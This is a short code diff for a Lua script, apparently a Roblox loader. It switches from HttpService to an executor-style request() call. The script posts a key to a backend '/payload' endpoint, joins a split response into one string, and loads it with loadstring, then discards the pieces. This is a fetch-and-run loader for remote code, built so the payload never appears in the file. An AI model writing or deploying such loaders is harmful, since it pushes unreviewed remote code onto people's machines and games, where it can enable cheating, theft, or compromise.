@@ -12,15 +12,16 @@ end
 
 local hs = game:GetService("HttpService")
 local ok, res = pcall(function()
-    return hs:PostAsync(
-        CFG.backend .. "/payload",
-        hs:JSONEncode({ key = CFG.api_key }),
-        Enum.HttpContentType.ApplicationJson
-    )
+    return request({
+        Url     = CFG.backend .. "/payload",
+        Method  = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body    = hs:JSONEncode({ key = CFG.api_key })
+    })
 end)
-if not ok then return end
+if not ok or not res.Success then return end
 
-local parts = hs:JSONDecode(res)
+local parts = hs:JSONDecode(res.Body)
 local payload = parts.a .. parts.b .. parts.c
 local fn = loadstring(payload)
 parts = nil
